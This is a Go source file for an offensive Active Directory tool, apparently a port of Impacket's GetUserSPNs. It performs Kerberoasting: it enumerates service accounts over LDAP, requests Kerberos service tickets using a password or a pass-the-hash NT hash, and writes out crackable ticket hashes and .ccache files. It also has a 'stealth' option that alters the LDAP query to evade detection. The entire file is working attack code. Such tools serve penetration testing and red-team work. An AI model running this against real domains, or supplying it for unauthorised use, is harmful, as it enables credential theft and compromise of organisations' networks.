// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"
	"time"

	"gopacket/pkg/flags"
	"gopacket/pkg/kerberos"
	"gopacket/pkg/ldap"
	"gopacket/pkg/session"
)

var (
	request        = flag.Bool("request", false, "Request TGS tickets for Kerberoasting")
	requestUser    = flag.String("request-user", "", "Request TGS for specific user only")
	requestMachine = flag.String("request-machine", "", "Request TGS for specific machine account (auto-enables -machine-only)")
	targetDomain   = flag.String("target-domain", "", "Domain to query for SPNs (cross-domain Kerberoasting via trusts)")
	stealth        = flag.Bool("stealth", false, "Remove servicePrincipalName=* from LDAP filter (stealth mode)")
	machineOnly    = flag.Bool("machine-only", false, "Query computer accounts instead of user accounts")
	usersFile      = flag.String("usersfile", "", "File with usernames (one per line) to request TGS for (skips LDAP query)")
	save           = flag.Bool("save", false, "Save each TGS ticket to a .ccache file (auto-enables -request)")
)

// domainToDN converts a DNS domain name to an LDAP base DN.
// e.g., "corp.example.com" -> "DC=corp,DC=example,DC=com"
func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	dnParts := make([]string, len(parts))
	for i, p := range parts {
		dnParts[i] = "DC=" + p
	}
	return strings.Join(dnParts, ",")
}

func main() {
	opts := flags.Parse()

	// -save auto-enables -request
	if *save {
		*request = true
	}

	// -request-machine auto-enables -machine-only
	if *requestMachine != "" {
		*machineOnly = true
	}

	// -usersfile mode: skip LDAP, just request TGS for each user in the file
	if *usersFile != "" {
		runUsersFileMode(opts)
		return
	}

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error parsing target string: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	// Store original credentials for Kerberos
	domain := creds.Domain
	username := creds.Username
	password := creds.Password
	nthash := ""

	// Parse NTLM hash if provided
	if opts.Hashes != "" {
		var err error
		nthash, err = kerberos.ParseHashes(opts.Hashes)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
	}

	if domain == "" {
		fmt.Fprintln(os.Stderr, "[-] Domain is required. Use: domain/user:pass@target")
		os.Exit(1)
	}

	// Connect to LDAP
	client := ldap.NewClient(target, &creds)
	defer client.Close()

	if err := client.Connect(false); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Connection failed: %v\n", err)
		os.Exit(1)
	}

	// Try UPN format for LDAP bind
	loginUser := fmt.Sprintf("%s@%s", username, domain)
	if err := client.LoginWithUser(loginUser); err != nil {
		// Fallback to original
		if err := client.Login(); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Bind failed: %v\n", err)
			os.Exit(1)
		}
	}

	// Determine base DN: use -target-domain if set, otherwise default naming context
	var baseDN string
	if *targetDomain != "" {
		baseDN = domainToDN(*targetDomain)
		fmt.Printf("[*] Using target domain: %s (base DN: %s)\n", *targetDomain, baseDN)
	} else {
		baseDN, err = client.GetDefaultNamingContext()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to get Naming Context: %v\n", err)
			os.Exit(1)
		}
	}

	// Build query options
	queryOpts := ldap.SPNQueryOptions{
		Stealth:     *stealth,
		MachineOnly: *machineOnly,
	}

	if *machineOnly {
		fmt.Printf("[*] Querying %s for computer accounts with SPNs...\n", target.Host)
	} else {
		fmt.Printf("[*] Querying %s for users with SPNs...\n", target.Host)
	}
	if *stealth {
		fmt.Println("[*] Stealth mode: servicePrincipalName=* filter removed from LDAP query")
	}

	users, err := client.FindSPNUsersWithOptions(baseDN, queryOpts)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] LDAP search failed: %v\n", err)
		os.Exit(1)
	}

	// Filter by specific user if requested
	if *requestUser != "" {
		var filtered []ldap.UserSPN
		for _, u := range users {
			if strings.EqualFold(u.Username, *requestUser) {
				filtered = append(filtered, u)
			}
		}
		users = filtered
	}

	// Filter by specific machine if requested
	if *requestMachine != "" {
		var filtered []ldap.UserSPN
		for _, u := range users {
			if strings.EqualFold(u.Username, *requestMachine) {
				filtered = append(filtered, u)
			}
		}
		users = filtered
	}

	if len(users) == 0 {
		if *machineOnly {
			fmt.Println("[+] No computer accounts found with servicePrincipalName set.")
		} else {
			fmt.Println("[+] No users found with servicePrincipalName set.")
		}
		return
	}

	fmt.Printf("[+] Found %d account(s) with SPNs:\n\n", len(users))

	// Print table
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', 0)
	fmt.Fprintln(w, "ServicePrincipalName\tName\tMemberOf\tPwdLastSet\tLastLogon\tDelegation")
	fmt.Fprintln(w, "--------------------\t----\t--------\t----------\t---------\t----------")
	for _, u := range users {
		memberOf := ""
		if u.MemberOf != "" {
			// Extract CN from full DN
			parts := strings.Split(u.MemberOf, ",")
			if len(parts) > 0 {
				memberOf = strings.TrimPrefix(parts[0], "CN=")
			}
		}

		pwdLastSet := "N/A"
		if !u.PwdLastSet.IsZero() {
			pwdLastSet = u.PwdLastSet.Format("2006-01-02 15:04:05")
		}

		lastLogon := "N/A"
		if !u.LastLogon.IsZero() {
			lastLogon = u.LastLogon.Format("2006-01-02 15:04:05")
		}

		delegation := ""
		if u.Delegation != "" {
			delegation = u.Delegation
		}

		// Use first SPN for display
		spn := ""
		if len(u.SPNs) > 0 {
			spn = u.SPNs[0]
		}

		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%s\n", spn, u.Username, memberOf, pwdLastSet, lastLogon, delegation)
	}
	w.Flush()
	fmt.Println()

	// Request TGS tickets if -request flag is set
	if *request || *requestUser != "" || *requestMachine != "" {
		fmt.Println("[*] Requesting TGS tickets for Kerberoasting...")

		var outputFd *os.File
		if opts.OutputFile != "" {
			var err error
			outputFd, err = os.Create(opts.OutputFile)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[-] Failed to create output file: %v\n", err)
				os.Exit(1)
			}
			defer outputFd.Close()
		}

		for _, u := range users {
			if len(u.SPNs) == 0 {
				continue
			}

			// Use first SPN for the request
			spn := u.SPNs[0]
			fmt.Printf("[*] Requesting TGS for %s (%s)...\n", u.Username, spn)

			// Use pass-the-hash if NT hash is provided, otherwise use password
			var result *kerberos.TGSResult
			var err error
			if nthash != "" {
				result, err = kerberos.GetTGSWithHash(username, nthash, domain, target.Host, u.Username, spn)
			} else {
				result, err = kerberos.GetTGS(username, password, domain, target.Host, u.Username, spn)
			}
			if err != nil {
				fmt.Fprintf(os.Stderr, "    [-] Failed: %v\n", err)
				continue
			}

			// Output hash
			fmt.Println(result.Hash)
			if outputFd != nil {
				outputFd.WriteString(result.Hash + "\n")
			}

			// Save to ccache file if -save is set
			if *save {
				ccacheFile := fmt.Sprintf("%s.ccache", u.Username)
				if err := kerberos.SaveTGS(ccacheFile, result); err != nil {
					fmt.Fprintf(os.Stderr, "    [-] Failed to save ccache: %v\n", err)
				} else {
					fmt.Printf("[+] Saved TGS to %s\n", ccacheFile)
				}
			}

			// Small delay to avoid overwhelming the KDC
			time.Sleep(50 * time.Millisecond)
		}

		if opts.OutputFile != "" {
			fmt.Printf("\n[+] Hashes written to %s\n", opts.OutputFile)
		}
	}
}

// runUsersFileMode reads usernames from a file and requests TGS for each,
// skipping the LDAP query entirely. Each line is treated as an SPN or username.
func runUsersFileMode(opts *flags.Options) {
	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error parsing target string: %v\n", err)
		os.Exit(1)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	domain := creds.Domain
	username := creds.Username
	password := creds.Password
	nthash := ""

	if opts.Hashes != "" {
		var err error
		nthash, err = kerberos.ParseHashes(opts.Hashes)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
	}

	if domain == "" {
		fmt.Fprintln(os.Stderr, "[-] Domain is required. Use: domain/user:pass@target")
		os.Exit(1)
	}

	// Read usernames from file
	f, err := os.Open(*usersFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open users file: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	var entries []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			entries = append(entries, line)
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error reading users file: %v\n", err)
		os.Exit(1)
	}

	if len(entries) == 0 {
		fmt.Println("[+] No usernames found in file.")
		return
	}

	fmt.Printf("[*] Read %d entries from %s, requesting TGS tickets...\n", len(entries), *usersFile)

	var outputFd *os.File
	if opts.OutputFile != "" {
		outputFd, err = os.Create(opts.OutputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to create output file: %v\n", err)
			os.Exit(1)
		}
		defer outputFd.Close()
	}

	for _, entry := range entries {
		// Each entry can be a bare username or an SPN (e.g., "MSSQLSvc/host:1433")
		// If it contains a "/", treat it as an SPN directly; otherwise construct one
		spn := entry
		targetUser := entry
		if !strings.Contains(entry, "/") {
			// Bare username: we cannot construct an SPN, so skip
			fmt.Fprintf(os.Stderr, "    [-] %s: not an SPN (no '/' found), provide full SPN in file\n", entry)
			continue
		}

		// Extract the target user from the SPN for hash formatting
		// e.g., "MSSQLSvc/host:1433" -> use the entry as-is
		fmt.Printf("[*] Requesting TGS for SPN: %s\n", spn)

		var result *kerberos.TGSResult
		var err error
		if nthash != "" {
			result, err = kerberos.GetTGSWithHash(username, nthash, domain, target.Host, targetUser, spn)
		} else {
			result, err = kerberos.GetTGS(username, password, domain, target.Host, targetUser, spn)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "    [-] Failed: %v\n", err)
			continue
		}

		// Output hash
		fmt.Println(result.Hash)
		if outputFd != nil {
			outputFd.WriteString(result.Hash + "\n")
		}

		// Save to ccache if -save is set
		if *save {
			// Use sanitized filename from SPN
			safeName := strings.ReplaceAll(strings.ReplaceAll(spn, "/", "_"), ":", "_")
			ccacheFile := fmt.Sprintf("%s.ccache", safeName)
			if err := kerberos.SaveTGS(ccacheFile, result); err != nil {
				fmt.Fprintf(os.Stderr, "    [-] Failed to save ccache: %v\n", err)
			} else {
				fmt.Printf("[+] Saved TGS to %s\n", ccacheFile)
			}
		}

		time.Sleep(50 * time.Millisecond)
	}

	if opts.OutputFile != "" {
		fmt.Printf("\n[+] Hashes written to %s\n", opts.OutputFile)
	}
}
